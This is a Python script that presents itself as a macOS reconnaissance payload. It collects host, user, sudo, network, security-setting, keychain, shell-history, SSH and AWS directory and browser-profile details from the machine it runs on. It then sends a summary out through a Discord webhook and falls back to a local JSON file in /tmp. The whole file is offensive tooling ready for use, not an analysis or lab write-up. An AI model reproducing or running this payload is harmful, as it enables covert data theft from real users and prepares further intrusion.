#!/usr/bin/env python3
"""
macOS System Reconnaissance Payload
Gathers comprehensive macOS system information and exfiltrates to Discord
"""

import os
import sys
import subprocess
import socket
import json
from pathlib import Path

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))

try:
    from src.webhook_utils import send_to_discord
except ImportError:
    print("Error: webhook_utils not found")
    sys.exit(1)


def run_command(cmd):
    """Execute shell command and return output"""
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=10
        )
        return result.stdout.strip()
    except Exception as e:
        return f"Error: {str(e)}"


def get_system_info():
    """Get basic macOS system information"""
    info = {}
    
    # System profiler data
    system_profiler = run_command('system_profiler SPSoftwareDataType SPHardwareDataType')
    info['system_profiler'] = system_profiler
    
    # Parse key information
    info['hostname'] = socket.gethostname()
    info['user'] = os.environ.get('USER', 'unknown')
    info['home'] = os.environ.get('HOME', 'unknown')
    info['shell'] = os.environ.get('SHELL', 'unknown')
    
    # macOS version
    info['macos_version'] = run_command('sw_vers -productVersion')
    info['macos_build'] = run_command('sw_vers -buildVersion')
    info['macos_name'] = run_command('sw_vers -productName')
    
    # Hardware info
    info['model'] = run_command('sysctl -n hw.model')
    info['cpu'] = run_command('sysctl -n machdep.cpu.brand_string')
    info['memory'] = run_command('sysctl -n hw.memsize')
    info['cpu_cores'] = run_command('sysctl -n hw.ncpu')
    
    # Serial number
    info['serial'] = run_command('system_profiler SPHardwareDataType | grep "Serial Number"')
    
    # Uptime
    info['uptime'] = run_command('uptime')
    
    return info


def get_user_info():
    """Get user and account information"""
    info = {}
    
    # Current user
    info['current_user'] = run_command('whoami')
    
    # User ID
    info['uid'] = run_command('id -u')
    info['gid'] = run_command('id -g')
    info['groups'] = run_command('groups')
    
    # All users
    info['all_users'] = run_command('dscl . -list /Users | grep -v "^_"')
    
    # Admin users
    info['admin_users'] = run_command('dscl . -read /Groups/admin GroupMembership')
    
    # Logged in users
    info['logged_users'] = run_command('who')
    
    # Last logins
    info['last_logins'] = run_command('last | head -20')
    
    # Check if has sudo
    sudo_check = run_command('sudo -n -l 2>&1')
    info['sudo_access'] = 'not allowed' not in sudo_check.lower()
    
    return info


def get_network_info():
    """Get network configuration"""
    info = {}
    
    # Network interfaces
    info['interfaces'] = run_command('ifconfig')
    
    # Active network service
    info['active_service'] = run_command('networksetup -listallnetworkservices')
    
    # WiFi info
    info['wifi_ssid'] = run_command('/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I | grep " SSID"')
    
    # DNS servers
    info['dns'] = run_command('scutil --dns | grep nameserver')
    
    # Routing table
    info['routes'] = run_command('netstat -rn')
    
    # Listening ports
    info['listening_ports'] = run_command('lsof -i -P -n | grep LISTEN')
    
    # Firewall status
    info['firewall'] = run_command('sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate 2>&1')
    
    return info


def get_security_info():
    """Get security settings"""
    info = {}
    
    # SIP (System Integrity Protection) status
    info['sip_status'] = run_command('csrutil status')
    
    # Gatekeeper status
    info['gatekeeper'] = run_command('spctl --status')
    
    # FileVault status
    info['filevault'] = run_command('fdesetup status')
    
    # Firewall status (detailed)
    info['firewall_details'] = run_command('sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getappblocked 2>&1 | head -20')
    
    # Screen lock settings
    info['screen_lock'] = run_command('defaults read com.apple.screensaver askForPassword 2>&1')
    
    # Find My Mac
    info['find_my_mac'] = run_command('nvram -p | grep fmm-mobileme-token')
    
    return info


def get_installed_apps():
    """Get installed applications"""
    info = {}
    
    # Applications folder
    info['applications'] = run_command('ls -la /Applications')
    
    # User applications
    home = os.environ.get('HOME', '')
    if home:
        info['user_applications'] = run_command(f'ls -la {home}/Applications 2>/dev/null')
    
    # Homebrew packages
    if os.path.exists('/usr/local/bin/brew') or os.path.exists('/opt/homebrew/bin/brew'):
        info['homebrew_packages'] = run_command('brew list 2>/dev/null')
    
    # Mac App Store apps
    info['mas_apps'] = run_command('system_profiler SPApplicationsDataType | grep "Location: /Applications" -B 3')
    
    return info


def get_browser_data():
    """Get browser information"""
    info = {}
    home = Path(os.environ.get('HOME', ''))
    
    # Safari data
    safari_dir = home / 'Library/Safari'
    if safari_dir.exists():
        info['safari_history'] = run_command(f'ls -lah "{safari_dir}"')
        info['safari_bookmarks'] = 'Bookmarks.plist exists' if (safari_dir / 'Bookmarks.plist').exists() else 'Not found'
    
    # Chrome data
    chrome_dir = home / 'Library/Application Support/Google/Chrome'
    if chrome_dir.exists():
        info['chrome_profiles'] = run_command(f'ls -la "{chrome_dir}"')
    
    # Firefox data
    firefox_dir = home / 'Library/Application Support/Firefox/Profiles'
    if firefox_dir.exists():
        info['firefox_profiles'] = run_command(f'ls -la "{firefox_dir}"')
    
    return info


def get_keychain_info():
    """Get keychain information"""
    info = {}
    
    # List keychains
    info['keychains'] = run_command('security list-keychains')
    
    # Default keychain
    info['default_keychain'] = run_command('security default-keychain')
    
    # Keychain info (non-sensitive)
    info['keychain_info'] = run_command('security show-keychain-info 2>&1')
    
    return info


def get_launch_agents():
    """Get launch agents and daemons"""
    info = {}
    home = os.environ.get('HOME', '')
    
    # User launch agents
    user_agents = Path(home) / 'Library/LaunchAgents'
    if user_agents.exists():
        info['user_launch_agents'] = run_command(f'ls -la "{user_agents}"')
    
    # System launch agents
    info['system_launch_agents'] = run_command('ls -la /Library/LaunchAgents 2>/dev/null')
    
    # Launch daemons
    info['launch_daemons'] = run_command('ls -la /Library/LaunchDaemons 2>/dev/null')
    
    # Login items
    info['login_items'] = run_command('osascript -e "tell application \\"System Events\\" to get the name of every login item" 2>/dev/null')
    
    return info


def get_shell_history():
    """Get shell history"""
    info = {}
    home = Path(os.environ.get('HOME', ''))
    
    # Bash history
    bash_history = home / '.bash_history'
    if bash_history.exists():
        info['bash_history'] = run_command(f'tail -30 "{bash_history}"')
    
    # Zsh history
    zsh_history = home / '.zsh_history'
    if zsh_history.exists():
        info['zsh_history'] = run_command(f'tail -30 "{zsh_history}"')
    
    # Fish history
    fish_history = home / '.local/share/fish/fish_history'
    if fish_history.exists():
        info['fish_history'] = run_command(f'tail -30 "{fish_history}"')
    
    return info


def get_interesting_files():
    """Find interesting files"""
    info = {}
    home = os.environ.get('HOME', '')
    
    # SSH keys
    ssh_dir = Path(home) / '.ssh'
    if ssh_dir.exists():
        info['ssh_keys'] = run_command(f'ls -la "{ssh_dir}"')
    
    # AWS credentials
    aws_dir = Path(home) / '.aws'
    if aws_dir.exists():
        info['aws_config'] = run_command(f'ls -la "{aws_dir}"')
    
    # Downloads folder (recent files)
    downloads = Path(home) / 'Downloads'
    if downloads.exists():
        info['recent_downloads'] = run_command(f'ls -lt "{downloads}" | head -20')
    
    # Desktop
    desktop = Path(home) / 'Desktop'
    if desktop.exists():
        info['desktop_files'] = run_command(f'ls -la "{desktop}"')
    
    return info


def main():
    """Main reconnaissance function"""
    print("[*] Starting macOS system reconnaissance...")
    
    recon_data = {
        'target': 'macOS System',
        'timestamp': subprocess.getoutput('date'),
    }
    
    # Gather all information
    print("[*] Gathering system information...")
    recon_data['system'] = get_system_info()
    
    print("[*] Gathering user information...")
    recon_data['users'] = get_user_info()
    
    print("[*] Gathering network information...")
    recon_data['network'] = get_network_info()
    
    print("[*] Gathering security information...")
    recon_data['security'] = get_security_info()
    
    print("[*] Gathering installed applications...")
    recon_data['applications'] = get_installed_apps()
    
    print("[*] Gathering browser data...")
    recon_data['browsers'] = get_browser_data()
    
    print("[*] Gathering keychain information...")
    recon_data['keychain'] = get_keychain_info()
    
    print("[*] Gathering launch agents...")
    recon_data['launch_agents'] = get_launch_agents()
    
    print("[*] Gathering shell history...")
    recon_data['shell_history'] = get_shell_history()
    
    print("[*] Finding interesting files...")
    recon_data['interesting_files'] = get_interesting_files()
    
    # Format for Discord
    message = f"""
🍎 **MACOS SYSTEM RECONNAISSANCE**

**Target:** {recon_data['system']['hostname']}
**User:** {recon_data['system']['user']}
**macOS:** {recon_data['system']['macos_version']} ({recon_data['system']['macos_build']})
**Model:** {recon_data['system']['model']}
**CPU:** {recon_data['system']['cpu']}

**SECURITY STATUS:**
• SIP: {recon_data['security']['sip_status']}
• Gatekeeper: {recon_data['security']['gatekeeper']}
• FileVault: {recon_data['security']['filevault']}
• Firewall: {recon_data['security']['firewall']}

**USER INFO:**
• Current User: {recon_data['users']['current_user']}
• Sudo Access: {'✅ YES' if recon_data['users']['sudo_access'] else '❌ NO'}
• Groups: {recon_data['users']['groups']}

**NETWORK:**
• WiFi SSID: {recon_data['network'].get('wifi_ssid', 'N/A')}
• Hostname: {recon_data['system']['hostname']}

**PERSISTENCE:**
• Launch Agents: {len(recon_data['launch_agents'].get('user_launch_agents', '').split('\\n'))} user agents found

Full macOS recon data collected and ready for analysis.
"""
    
    # Send to Discord
    print("[*] Exfiltrating to Discord...")
    success = send_to_discord(message)
    
    if success:
        print("✓ Data sent to Discord successfully!")
    else:
        print("✗ Failed to send data to Discord")
        # Save locally as backup
        backup_file = '/tmp/macos_recon.json'
        with open(backup_file, 'w') as f:
            json.dump(recon_data, f, indent=2)
        print(f"✓ Data saved locally to {backup_file}")
    
    return recon_data


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Reconnaissance interrupted by user")
    except Exception as e:
        print(f"[!] Error: {str(e)}")
